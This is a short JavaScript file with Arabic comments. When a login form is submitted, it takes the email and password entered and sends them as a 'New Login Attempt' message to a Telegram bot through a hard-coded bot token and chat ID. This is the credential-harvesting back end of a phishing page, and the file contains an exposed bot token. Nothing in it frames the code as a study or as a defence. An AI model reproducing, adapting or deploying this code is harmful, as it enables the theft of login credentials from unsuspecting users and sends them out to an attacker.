document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('telegramForm').addEventListener('submit', function (e) {
      e.preventDefault();

      // جمع البيانات من النموذج
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      // صياغة الرسالة
      const telegramMessage = `New Login Attempt:\n\nEmail: ${email}\nPassword: ${password}`;

      // بيانات البوت
      const TOKEN = '7738838668:AAEmRaEw30LbmN4r_AHgTFRW2n4cZLczYUM'; // استبدل بـ Token الخاص بك
      const CHAT_ID = '6005270698'; // استبدل بـ Chat ID الخاص بك
      const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

      // إرسال البيانات إلى Telegram
      fetch(URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: telegramMessage,
        }),
      })
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            alert('Message sent successfully!');
          } else {
            alert('Failed to send message.');
          }
        })
        .catch(error => {
          console.error('Error:', error);
          alert('An error occurred.');
        });
    });
});